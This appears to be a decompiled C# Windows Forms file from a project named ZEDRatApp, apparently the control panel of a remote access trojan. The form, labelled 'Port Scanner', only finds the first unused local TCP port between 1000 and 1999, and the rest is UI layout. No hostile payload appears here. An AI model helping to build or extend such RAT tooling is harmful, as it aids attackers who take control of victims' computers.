using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using ns1;
using ns2;
using TextBox = System.Windows.Forms.TextBox;

namespace ZEDRatApp.Forms
{
	public class FrmFindOpenPort : Form
	{
		private IContainer components;

		private SiticoneElipse siticoneElipse1;

		private SiticoneTextBox txtOpen;

		private SiticoneRoundedButton btnBuild;

		private SiticoneElipse siticoneElipse2;

		private Guna2ShadowForm guna2ShadowForm1;

		private SiticoneControlBox siticoneControlBox1;

		private SiticonePictureBox siticonePictureBox1;

		private SiticoneLabel siticoneLabel12;

		private BunifuSeparator bunifuSeparator2;

		public FrmFindOpenPort()
		{
			this.InitializeComponent();
		}

		private string GetOpenPort()
		{
			int num = 2000;
			List<int> list = (from p in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners()
				select p.Port).ToList();
			int num2 = 0;
			for (int i = 1000; i < num; i++)
			{
				if (!list.Contains(i))
				{
					num2 = i;
					break;
				}
			}
			return num2.ToString();
		}

		private void btnBuild_Click(object sender, EventArgs e)
		{
			(this.txtOpen).Text = this.GetOpenPort();
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.FrmFindOpenPort));
			this.siticoneElipse1 = new SiticoneElipse(this.components);
			this.btnBuild = new SiticoneRoundedButton();
			this.txtOpen = new SiticoneTextBox();
			this.siticoneElipse2 = new SiticoneElipse(this.components);
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.siticoneControlBox1 = new SiticoneControlBox();
			this.siticonePictureBox1 = new SiticonePictureBox();
			this.siticoneLabel12 = new SiticoneLabel();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			((System.ComponentModel.ISupportInitialize)this.siticonePictureBox1).BeginInit();
			base.SuspendLayout();
			this.siticoneElipse1.BorderRadius = 0;
			this.siticoneElipse1.TargetControl = this;
			((System.Windows.Forms.Control)(object)this.btnBuild).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			((SiticoneButton)this.btnBuild).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnBuild).BorderThickness = 1;
			((SiticoneButton)this.btnBuild).CheckedState.Parent = this.btnBuild;
			((SiticoneButton)this.btnBuild).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnBuild).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			((SiticoneButton)this.btnBuild).CustomImages.Parent = this.btnBuild;
			((SiticoneButton)this.btnBuild).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnBuild).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnBuild).ForeColor = System.Drawing.Color.White;
			((SiticoneButton)this.btnBuild).HoveredState.Parent = (CustomButtonBase)(object)this.btnBuild;
			((System.Windows.Forms.Control)(object)this.btnBuild).Location = new System.Drawing.Point(590, 180);
			((System.Windows.Forms.Control)(object)this.btnBuild).Name = "btnBuild";
			((SiticoneButton)this.btnBuild).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnBuild;
			((System.Windows.Forms.Control)(object)this.btnBuild).Size = new System.Drawing.Size(167, 36);
			((System.Windows.Forms.Control)(object)this.btnBuild).TabIndex = 23;
			((System.Windows.Forms.Control)(object)this.btnBuild).Text = "Find First Open Port";
			((System.Windows.Forms.Control)(object)this.btnBuild).Click += new System.EventHandler(btnBuild_Click);
			((System.Windows.Forms.Control)(object)this.txtOpen).Anchor = System.Windows.Forms.AnchorStyles.None;
			this.txtOpen.BorderThickness = 0;
			((System.Windows.Forms.Control)(object)this.txtOpen).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtOpen).DefaultText = "";
			this.txtOpen.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtOpen.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtOpen.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtOpen.DisabledState.Parent = this.txtOpen;
			this.txtOpen.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtOpen.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.txtOpen.FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.txtOpen.FocusedState.Parent = this.txtOpen;
			this.txtOpen.HoveredState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.txtOpen.HoveredState.Parent = this.txtOpen;
			((System.Windows.Forms.Control)(object)this.txtOpen).Location = new System.Drawing.Point(33, 89);
			((System.Windows.Forms.Control)(object)this.txtOpen).Name = "txtOpen";
			(this.txtOpen).PasswordChar = '\0';
			this.txtOpen.PlaceholderText = "";
			(this.txtOpen).SelectedText = "";
			this.txtOpen.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtOpen;
			((System.Windows.Forms.Control)(object)this.txtOpen).Size = new System.Drawing.Size(724, 84);
			((System.Windows.Forms.Control)(object)this.txtOpen).TabIndex = 24;
			this.siticoneElipse2.BorderRadius = 40;
			this.siticoneElipse2.TargetControl = (System.Windows.Forms.Control)(object)this.txtOpen;
			this.guna2ShadowForm1.TargetForm = this;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).BackColor = System.Drawing.Color.Transparent;
			this.siticoneControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.siticoneControlBox1.BorderRadius = 12;
			this.siticoneControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.siticoneControlBox1.HoveredState.Parent = (ControlBox)(object)this.siticoneControlBox1;
			this.siticoneControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Location = new System.Drawing.Point(743, 12);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Name = "siticoneControlBox1";
			this.siticoneControlBox1.PressedColor = System.Drawing.Color.Red;
			this.siticoneControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticoneControlBox1;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).TabIndex = 25;
			((System.Windows.Forms.PictureBox)(object)this.siticonePictureBox1).Image = (System.Drawing.Image)resources.GetObject("siticonePictureBox1.Image");
			((System.Windows.Forms.Control)(object)this.siticonePictureBox1).Location = new System.Drawing.Point(12, 12);
			((System.Windows.Forms.Control)(object)this.siticonePictureBox1).Name = "siticonePictureBox1";
			this.siticonePictureBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticonePictureBox1;
			((System.Windows.Forms.Control)(object)this.siticonePictureBox1).Size = new System.Drawing.Size(37, 35);
			((System.Windows.Forms.PictureBox)(object)this.siticonePictureBox1).SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			((System.Windows.Forms.PictureBox)(object)this.siticonePictureBox1).TabIndex = 53;
			((System.Windows.Forms.PictureBox)(object)this.siticonePictureBox1).TabStop = false;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Location = new System.Drawing.Point(347, 19);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Name = "siticoneLabel12";
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Size = new System.Drawing.Size(102, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).TabIndex = 54;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Text = "Port Scanner";
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(-2, 52);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(801, 9);
			this.bunifuSeparator2.TabIndex = 91;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(800, 228);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticonePictureBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtOpen);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnBuild);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmFindOpenPort";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "FrmFindOpenPort";
			((System.ComponentModel.ISupportInitialize)this.siticonePictureBox1).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
